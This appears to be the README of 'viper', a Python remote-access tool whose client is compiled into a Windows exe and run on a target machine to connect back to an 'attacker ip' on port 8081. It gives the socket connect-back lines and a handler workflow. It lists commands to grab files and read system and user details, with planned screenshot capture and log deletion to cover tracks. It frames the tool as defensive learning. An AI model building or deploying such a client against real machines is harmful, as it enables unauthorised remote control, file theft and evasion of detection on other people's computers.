
Copyright © 2017, [Jinverar owner of black signals](https://github.com/jinverar).
//=> Copyright (c) 2017 jinverar

VIPER

"""
This is viper and designed to control remote clients that get deployed on computers in defense of exploitation frameworks!
The viper is designed in order to retrieve compromised files, processes, and services in case you have to reach out and grab information. 
the viper can also be used for testing exploitation and enumeration for the purpose of learning offensive for defensible actions.

This program was created as a basic function to reach out and grab things fast! Powered by python. 


Requirements

viper has been tested on kali 2.0

The installer.sh will do this for you

python-twisted +16.6;
PyCrypto;
pyOpenSSl;
Zope interface;
python 2.7;
python-2.7.13.msi;
pyinstaller-3.1.1;
future-0.16.0;
wine;
winetricks;

Usage:

start the viper console:

$$> chmod +x viper.py

$$> python viper.py

Navigate into the payloads and change the ip address and port number inside the client


usage:

start the handler first and then start the client on the target machine

viper main commands:


[+] handler ========= > "starts the viper server and waits for a call back" 

[*] client2exe ========= > "creates a basic exe file from viperclient.py and stores it inside payloads"; 

Inside viper client modify these two lines with your ip address

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(('address you want to connect back to, attacker ip', 8081))


viper connection commands:
use these once you get the call back from the client. first you will need to enter in the local host and port number that you assigned to the client before deploying. 

[*] grab*<filename> ========= > grabs the file and saves it to the local desktop as .txt";

[*] getenv       ========= >  prints the system information";

[*] getuid       ========= > Get the user level access of the shell";

[*] SystemInfo   ========= > Get Fingerprint of the system"; todo

[*] capture      ========= > take images of the host machine "; todo

[*] Cover        ========= > Delete all traces of logs"; todo


Contributing

    Fork it!
    Create your feature branch: git checkout -b my-new-feature
    Commit your changes: git commit -am 'Add some feature'
    Push to the branch: git push origin my-new-feature
    Submit a Pull Request
